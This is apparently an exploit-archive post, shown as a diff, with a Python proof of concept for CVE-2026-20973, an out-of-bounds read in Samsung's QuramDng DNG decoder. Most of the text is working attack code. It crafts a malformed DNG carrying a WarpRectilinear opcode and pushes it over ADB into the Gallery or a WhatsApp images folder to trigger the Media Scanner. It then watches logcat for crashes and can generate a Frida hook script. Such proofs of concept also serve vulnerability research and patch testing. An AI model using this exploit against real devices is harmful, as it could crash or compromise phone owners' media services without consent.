@@ -1,0 +1,468 @@
+=============================================================================================================================================
+| # Title     : Samsung QuramDng Warp OOB Read PoC                                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.samsung.com/n_africa/                                                                                           |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/215033/ & CVE-2026-20973
+
+[+] Summary    : This Python proof of concept demonstrates an out-of-bounds (OOB) read vulnerability in Samsung’s QuramDng image processing library, triggered via a specially crafted DNG (Digital Negative) file.
+                 The script programmatically builds a minimal but valid DNG file containing a malformed WarpRectilinear opcode, designed to provoke unsafe memory access when processed by Samsung components such as Media Scanner (ipservice) or the Gallery app.
+
+[+] The PoC includes:
+
+Automatic creation of the malicious DNG file.
+
+Multiple trigger methods (Media Scanner or Gallery).
+
+Logcat-based crash monitoring to detect SIGSEGV or QuramDng-related faults.
+
+Optional generation of a Frida JavaScript monitoring script to observe Warp-related function calls at runtime.
+
+[+]PoC : python poc.py
+
+#!/usr/bin/env python3
+
+import struct
+import os
+import subprocess
+import sys
+import time
+
+
+
+def create_dng_file(filename="exploit.dng", width=3, height=3):
+    """
+    
+    """
+    print(f"[+] Creating DNG {width}x{height}")
+    
+    data = bytearray()
+    data.extend(b'II')                    
+    data.extend(struct.pack('<H', 42))     
+    data.extend(struct.pack('<I', 8))      
+    data.extend(struct.pack('<H', 7))
+    data.extend(struct.pack('<HH', 256, 4))  
+    data.extend(struct.pack('<I', 1))        
+    data.extend(struct.pack('<I', width))    
+    data.extend(struct.pack('<HH', 257, 4))
+    data.extend(struct.pack('<I', 1))
+    data.extend(struct.pack('<I', height))
+    data.extend(struct.pack('<HH', 258, 3))   
+    data.extend(struct.pack('<I', 3))        
+    bps_offset = 8 + 2 + (7 * 12) + 4 + 6    
+    data.extend(struct.pack('<I', bps_offset))
+    data.extend(struct.pack('<HH', 259, 3))
+    data.extend(struct.pack('<I', 1))
+    data.extend(struct.pack('<H', 1))         
+    data.extend(b'\x00\x00')
+    data.extend(struct.pack('<HH', 262, 3))
+    data.extend(struct.pack('<I', 1))
+    data.extend(struct.pack('<H', 2))        
+    data.extend(b'\x00\x00')
+    data.extend(struct.pack('<HH', 273, 4))
+    data.extend(struct.pack('<I', 1))
+    strip_offset = bps_offset + 6 + (width * height * 3 * 2) + 100
+    data.extend(struct.pack('<I', strip_offset))
+    data.extend(struct.pack('<HH', 51024, 1))  
+    opcode_size = 100
+    data.extend(struct.pack('<I', opcode_size))
+    opcode_offset = bps_offset + 6
+    data.extend(struct.pack('<I', opcode_offset))
+    data.extend(struct.pack('<I', 0))
+
+    while len(data) < bps_offset:
+        data.extend(b'\x00')
+    data.extend(struct.pack('<HHH', 16, 16, 16))
+
+    while len(data) < opcode_offset:
+        data.extend(b'\x00')
+
+    opcode = bytearray()
+    opcode.extend(struct.pack('<H', 9))      
+    opcode.extend(struct.pack('<H', 1))     
+    opcode.extend(struct.pack('<I', 0))     
+    opcode.extend(struct.pack('<I', 3))
+    opcode.extend(struct.pack('<I', 0))      
+    opcode.extend(struct.pack('<I', 0))     
+    opcode.extend(struct.pack('<I', height)) 
+    opcode.extend(struct.pack('<I', width))  
+    opcode.extend(struct.pack('<f', 0.0))
+    opcode.extend(struct.pack('<f', 0.0))
+
+    for i in range(8):
+        val = 1000.0 if i == 0 else 1.0
+        opcode.extend(struct.pack('<f', val))
+    for _ in range(3 * 3):
+        opcode.extend(struct.pack('<f', 1.0))
+    if len(opcode) < opcode_size:
+        opcode.extend(b'\xCC' * (opcode_size - len(opcode)))
+    
+    data.extend(opcode)
+
+    for y in range(height):
+        for x in range(width):
+            for c in range(3):  
+                value = (y << 8) | x | (c << 12)
+                data.extend(struct.pack('<H', value))
+    
+    data.extend(b'OOB_DATA:START')
+    for i in range(512):
+        data.extend(struct.pack('B', (i % 26) + 65))  # A-Z pattern
+
+    with open(filename, 'wb') as f:
+        f.write(data)
+    
+    print(f"[+] Created {filename} ({len(data)} bytes)")
+    return filename
+
+def check_adb():
+    """Check ADB connection"""
+    try:
+        result = subprocess.run(['adb', 'devices'], 
+                              capture_output=True, text=True, timeout=5)
+        return 'device' in result.stdout
+    except:
+        return False
+
+def push_file(local_file, remote_path):
+    """Push file to device"""
+    try:
+
+        remote_dir = os.path.dirname(remote_path)
+        if remote_dir:
+            subprocess.run(['adb', 'shell', 'mkdir', '-p', remote_dir],
+                         capture_output=True)
+
+        result = subprocess.run(['adb', 'push', local_file, remote_path],
+                              capture_output=True, text=True, timeout=30)
+        return result.returncode == 0
+    except:
+        return False
+
+def trigger_media_scanner(file_path):
+    """Trigger Media Scanner"""
+    try:
+        cmd = [
+            'adb', 'shell', 'am', 'broadcast',
+            '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
+            '-d', f'file://{file_path}'
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        return result.returncode == 0
+    except:
+        return False
+
+def open_with_gallery(file_path):
+    """Open file with Gallery"""
+    try:
+        cmd = [
+            'adb', 'shell', 'am', 'start',
+            '-a', 'android.intent.action.VIEW',
+            '-t', 'image/x-adobe-dng',
+            '-d', f'file://{file_path}',
+            'com.samsung.gallery3d'
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        return result.returncode == 0
+    except:
+        return False
+
+def monitor_logs(timeout=120):
+    """
+    Monitor logs for crashes related to QuramDng
+    Simple and reliable version
+    """
+    print(f"[*] Monitoring logs for {timeout} seconds...")
+    print("[*] Press Ctrl+C to stop")
+    
+    try:
+        subprocess.run(['adb', 'logcat', '-c'], capture_output=True)
+        
+        cmd = ['adb', 'logcat', '-s', 'libc:V', 'DEBUG:V']
+        proc = subprocess.Popen(cmd,
+                              stdout=subprocess.PIPE,
+                              stderr=subprocess.PIPE,
+                              text=True,
+                              bufsize=1,
+                              universal_newlines=True)
+        
+        start_time = time.time()
+        interesting = []
+        
+        while time.time() - start_time < timeout:
+            if proc.poll() is not None:
+                break
+            
+            try:
+                line = proc.stdout.readline()
+                if not line:
+                    time.sleep(0.1)
+                    continue
+                
+                line = line.strip()
+
+                if any(keyword in line for keyword in [
+                    'SIGSEGV', 'Fatal signal', 'libimagecodec',
+                    'QuramDng', 'Warp', 'out-of-bounds'
+                ]):
+                    interesting.append(line)
+                    print(f"[!] {line}")
+                    if 'libimagecodec.quram' in line:
+                        print("[+] QuramDng library involved!")
+
+                    if 'backtrace:' in line:
+                        print("[+] Crash backtrace detected")
+                        
+                        # Read next few lines for backtrace
+                        for _ in range(20):
+                            try:
+                                bt_line = proc.stdout.readline().strip()
+                                if bt_line and bt_line.startswith('#'):
+                                    print(f"    {bt_line}")
+                            except:
+                                break
+                elapsed = int(time.time() - start_time)
+                if elapsed % 10 == 0:
+                    print(f"[*] {elapsed}/{timeout}s", end='\r', flush=True)
+            
+            except (KeyboardInterrupt, EOFError):
+                print("\n[*] Stopped by user")
+                break
+            except:
+                continue
+        try:
+            proc.terminate()
+            proc.wait(timeout=2)
+        except:
+            pass
+        
+        print(f"\n[*] Monitoring complete")
+        
+        if interesting:
+            print(f"[*] Found {len(interesting)} interesting lines")
+            return True, interesting
+        else:
+            print("[-] No interesting logs found")
+            return False, []
+            
+    except Exception as e:
+        print(f"[-] Monitoring error: {e}")
+        return False, []
+
+def generate_frida_script():
+    """
+    Generate correct Frida JavaScript for monitoring
+    """
+    js_code = """/*
+ * Frida Script for QuramDng Monitoring
+ * Simple and working version
+ */
+
+console.log("[+] Starting QuramDng monitor...");
+
+var libName = "libimagecodec.quram.so";
+var found = false;
+var interval = setInterval(function() {
+    var modules = Process.enumerateModules();
+    
+    for (var i = 0; i < modules.length; i++) {
+        var module = modules[i];
+        if (module.name && module.name.indexOf(libName) !== -1) {
+            console.log("[+] Library found: " + module.name);
+            console.log("    Base: " + module.base);
+            found = true;
+            clearInterval(interval);
+            hookFunctions(module);
+            break;
+        }
+    }
+    
+    if (!found) {
+        console.log("[*] Waiting for " + libName + "...");
+    }
+}, 1000);
+
+function hookFunctions(module) {
+    console.log("[+] Looking for functions...");
+    
+    var symbols = module.enumerateSymbols();
+    var targets = [];
+
+    symbols.forEach(function(symbol) {
+        var name = symbol.name || "";
+        if (name.indexOf("Warp") !== -1) {
+            targets.push({
+                name: name,
+                address: symbol.address
+            });
+        }
+    });
+    
+    console.log("[+] Found " + targets.length + " Warp functions");
+
+    targets.forEach(function(target) {
+        try {
+            Interceptor.attach(target.address, {
+                onEnter: function(args) {
+                    console.log("\\n[+] " + target.name + " called");
+                    this.startTime = Date.now();
+                },
+                
+                onLeave: function(retval) {
+                    var duration = Date.now() - this.startTime;
+                    console.log("[+] " + target.name + " returned (" + duration + "ms)");
+                }
+            });
+            console.log("    [*] Hooked: " + target.name);
+        } catch(e) {
+            console.log("    [-] Failed to hook " + target.name + ": " + e);
+        }
+    });
+    
+    console.log("\\n[+] Monitoring active. Process DNG to see activity.");
+}
+
+setTimeout(function() {
+    console.log("[+] Monitor timeout reached");
+    clearInterval(interval);
+}, 600000);
+"""
+    
+    filename = "monitor.js"
+    with open(filename, 'w') as f:
+        f.write(js_code)
+    
+    print(f"[+] Frida script saved to {filename}")
+    print("\nUsage:")
+    print("  1. Start Frida server on device:")
+    print("     adb shell /data/local/tmp/frida-server &")
+    print("  2. Run monitor:")
+    print("     frida -U com.samsung.ipservice -l monitor.js")
+    
+    return filename
+
+def main():
+    """Main program - simple and reliable"""
+    print("=" * 60)
+    print("Samsung QuramDng Warp OOB Read PoC")
+    print("CVE-2026-20973")
+    print("=" * 60)
+
+    print("\n[*] Checking ADB...")
+    if not check_adb():
+        print("[-] ADB not connected")
+        print("\nPlease:")
+        print("1. Enable USB debugging")
+        print("2. Connect device")
+        print("3. Accept debugging prompt")
+        return
+    print("[+] ADB connected")
+
+    print("\n[*] Creating DNG file...")
+    try:
+        dng_file = create_dng_file()
+    except Exception as e:
+        print(f"[-] Failed to create DNG: {e}")
+        return
+
+    print("\nChoose method:")
+    print("1. Media Scanner (ipservice - automatic)")
+    print("2. Gallery (manual - immediate)")
+    print("3. Just create file")
+    print("4. Generate Frida script")
+    
+    choice = input("\nChoice [1-4]: ").strip()
+    
+    if choice == "1":
+
+        print("\n[*] Using Media Scanner method...")
+
+        remote_path = "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/exploit.dng"
+        if push_file(dng_file, remote_path):
+            print("[+] File pushed")
+
+            if trigger_media_scanner(remote_path):
+                print("[+] Media Scanner triggered")
+                print("[*] ipservice will process in ~5 minutes")
+                print("\n[*] Starting log monitor...")
+                success, logs = monitor_logs(180)  # 3 minutes
+                
+                if success:
+                    print("\n[+] Possible crash detected!")
+                else:
+                    print("\n[-] No crash detected in monitoring period")
+            else:
+                print("[-] Failed to trigger Media Scanner")
+        else:
+            print("[-] Failed to push file")
+    
+    elif choice == "2":
+
+        print("\n[*] Using Gallery method...")
+        
+        remote_path = "/sdcard/exploit.dng"
+        if push_file(dng_file, remote_path):
+            print("[+] File pushed")
+            
+            if open_with_gallery(remote_path):
+                print("[+] Gallery opened")
+                print("[*] Gallery will process the DNG")
+                print("\n[*] Monitoring for 30 seconds...")
+                success, logs = monitor_logs(30)
+                
+                if success:
+                    print("\n[+] Possible crash detected!")
+                else:
+                    print("\n[-] No crash detected")
+            else:
+                print("[-] Failed to open Gallery")
+        else:
+            print("[-] Failed to push file")
+    
+    elif choice == "3":
+        print(f"\n[+] File created: {dng_file}")
+        print("\nTo test manually:")
+        print(f"  adb push {dng_file} /sdcard/")
+        print(f"  adb shell am start -a android.intent.action.VIEW \\")
+        print(f"    -t image/x-adobe-dng -d file:///sdcard/{os.path.basename(dng_file)}")
+    
+    elif choice == "4":
+        generate_frida_script()
+    
+    else:
+        print("[-] Invalid choice")
+
+    print("\n[*] Cleaning up...")
+    try:
+        # Remove local file
+        if os.path.exists(dng_file):
+            os.remove(dng_file)
+            print(f"[+] Removed {dng_file}")
+
+        subprocess.run(['adb', 'shell', 'rm', '-f',
+                       '/sdcard/exploit.dng',
+                       '/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/exploit.dng'],
+                     capture_output=True)
+        print("[+] Cleaned device files")
+    except:
+        pass
+    
+    print("\n" + "=" * 60)
+    print("Done")
+    print("=" * 60)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n[*] Interrupted by user")
+    except Exception as e:
+        print(f"\n[-] Error: {e}")
+        import traceback
+        traceback.print_exc()
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
